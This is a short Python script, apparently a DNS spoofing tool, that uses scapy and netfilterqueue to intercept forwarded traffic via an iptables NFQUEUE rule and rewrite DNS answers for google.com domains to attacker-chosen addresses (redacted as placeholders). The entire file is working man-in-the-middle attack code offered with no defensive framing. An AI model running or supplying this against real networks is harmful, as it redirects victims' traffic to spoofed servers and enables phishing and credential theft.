from scapy.all import *
from scapy.layers.inet import IP
from netfilterqueue import NetfilterQueue
import os

dns = {
        b"www.google.com.": "xxxxxxxxx",
        b"google.com": "xxxxxxxxxxxx"
        }

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSRR):
        print("PROCESSING : ", scapy_packet.summary())

        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("FORWARDING! > ", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify_packet(packet):
    qname = packet[DNSQR].qname
    if qname not in dns:
        print("NO MODIFICATION > ", qname)
        return packet
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns[qname])

    packet[DNS].ancount = 1

    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet
Q = 0
os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num {}".format(Q))

queue = NetfilterQueue()

try:
    queue.bind(Q, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("flishing..")
    os.system("iptables --flush")
